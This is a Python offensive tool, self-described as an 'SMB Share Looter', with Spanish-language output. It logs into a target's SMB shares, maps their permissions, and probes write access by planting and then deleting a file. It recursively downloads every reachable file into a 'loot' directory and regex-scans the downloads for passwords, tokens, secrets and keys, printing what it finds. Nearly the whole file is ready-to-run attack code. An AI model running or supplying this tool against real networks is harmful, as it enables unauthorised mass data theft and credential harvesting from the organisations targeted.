#!/usr/bin/env python3
import argparse
import os
import re
import ipaddress
from impacket.smbconnection import SMBConnection
from colorama import init, Fore, Style

init(autoreset=True)

CREDS_KEYWORDS = ['password', 'passwd', 'pwd', 'secret', 'token', 'vault', 'key']

def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def has_write_access(conn, share, path):
    testfile = os.path.join(path, "__test_write__.txt")
    try:
        conn.putFile(share, testfile, lambda x: None)
        conn.deleteFile(share, testfile)
        return True
    except:
        return False

def check_smb(ip, username='', password='', domain='', download_dir='loot', check_write=False):
    try:
        conn = SMBConnection(ip, ip)
        conn.login(username, password, domain)
        print(f"{Fore.GREEN}[+] Conectado a SMB en {ip}{Style.RESET_ALL}")

        shares = conn.listShares()
        print(f"\n{Fore.CYAN}{'PROTO':<8}{'IP':<16}{'PORT':<6}{'DOMAIN':<12}{'SHARE':<22}{'PERM':<14}{'REMARK'}")
        print(f"{'-'*90}")

        for share in shares:
            share_name = share['shi1_netname'][:-1]
            remark = share.get('shi1_remark', '').strip() or "-"
            domain_display = domain if domain else "AUTHORITY"
            port = "445"

            if share_name in ['IPC$', 'ADMIN$', 'C$']:
                perm = "READ" if share_name == 'IPC$' else "-"
            else:
                try:
                    conn.listPath(share_name, '\\*')
                    perm = "READ"
                    if check_write and has_write_access(conn, share_name, ''):
                        perm = "READ/WRITE"
                except:
                    perm = "ACCESS DENIED"

            print(f"SMB      {ip:<16}{port:<6}{domain_display:<12}{share_name:<22}{perm:<14}{remark}")

        # Segunda fase: árbol + descargas
        for share in shares:
            share_name = share['shi1_netname'][:-1]
            if share_name in ['IPC$', 'ADMIN$']:
                print(f"{Fore.YELLOW}[-] Ignorando share {share_name}")
                continue

            try:
                print(f"\n{Fore.CYAN}[*] Explorando árbol en: {share_name}")
                print_tree(conn, share_name, '', check_write=check_write)
                print(f"{Fore.CYAN}[→] Iniciando descarga desde '{share_name}'")
                list_and_download(conn, share_name, '', download_dir, ip)
            except Exception as e:
                print(f"{Fore.RED}[!] Error accediendo a {share_name}: {e}")

        conn.close()
    except Exception as e:
        print(f"{Fore.RED}[!] Falló la conexión SMB: {e}")

def print_tree(conn, share, path, indent="", check_write=False):
    try:
        files = conn.listPath(share, path + '\\*')
        for f in files:
            name = f.get_longname()
            if name in ['.', '..']:
                continue

            full_path = os.path.join(path, name)
            try:
                conn.listPath(share, full_path + '\\*')
                if check_write and has_write_access(conn, share, full_path):
                    print(f"{indent}{Fore.GREEN}[R/W] {name}/")
                else:
                    print(f"{indent}{Fore.GREEN}[R] {name}/")
                print_tree(conn, share, full_path, indent + "    ", check_write)
            except Exception:
                if f.is_directory():
                    print(f"{indent}{Fore.RED}[X] {name}/")
                else:
                    print(f"{indent}{Fore.BLUE}- {name}")
    except Exception:
        print(f"{indent}{Fore.RED}[X] {path or share}/")

def list_and_download(conn, share, path, download_dir, ip):
    try:
        files = conn.listPath(share, path + '\\*')
        for f in files:
            filename = f.get_longname()
            if filename in ['.', '..']:
                continue

            full_remote_path = os.path.join(path, filename)
            local_path = os.path.join(download_dir, ip, share, path)

            if f.is_directory():
                list_and_download(conn, share, full_remote_path, download_dir, ip)
            else:
                os.makedirs(local_path, exist_ok=True)
                local_file = os.path.join(local_path, filename)

                try:
                    with open(local_file, 'wb') as f_out:
                        print(f"{Fore.YELLOW}📥 Descargando: {share}/{full_remote_path}")
                        conn.getFile(share, full_remote_path, f_out.write)
                    analyze_file(local_file)
                except Exception as e:
                    print(f"{Fore.RED}[!] Error descargando {share}/{full_remote_path}: {e}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error listando ruta {path}: {e}")

def analyze_file(filepath):
    try:
        if os.path.getsize(filepath) > 5 * 1024 * 1024:  # Evitar archivos muy grandes
            return
        with open(filepath, 'r', errors='ignore') as f:
            content = f.read()
            for keyword in CREDS_KEYWORDS:
                matches = re.findall(rf"{keyword}\s*[:=]\s*['\"]?([^\s'\"]+)", content, re.IGNORECASE)
                for m in matches:
                    print(f"{Fore.MAGENTA}[🔐] Posible credencial en {filepath}: {keyword} = {m}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error analizando {filepath}: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="🧰 SMB Share Looter con Árbol, Permisos y Detección de Credenciales"
    )
    parser.add_argument("ip", nargs="?", help="IP del objetivo")
    parser.add_argument("-u", "--username", default="", help="Nombre de usuario")
    parser.add_argument("-p", "--password", default="", help="Contraseña")
    parser.add_argument("-d", "--domain", default="", help="Dominio (opcional)")
    parser.add_argument("-o", "--output", default="loot", help="Directorio de descarga")
    parser.add_argument("--check-write", action="store_true", help="Verificar permisos de escritura")

    args = parser.parse_args()

    if not args.ip or not is_valid_ip(args.ip):
        print(f"{Fore.RED}[!] Debes proporcionar una IP válida del objetivo.\n")
        parser.print_help()
        exit(1)

    check_smb(args.ip, args.username, args.password, args.domain, args.output, args.check_write)
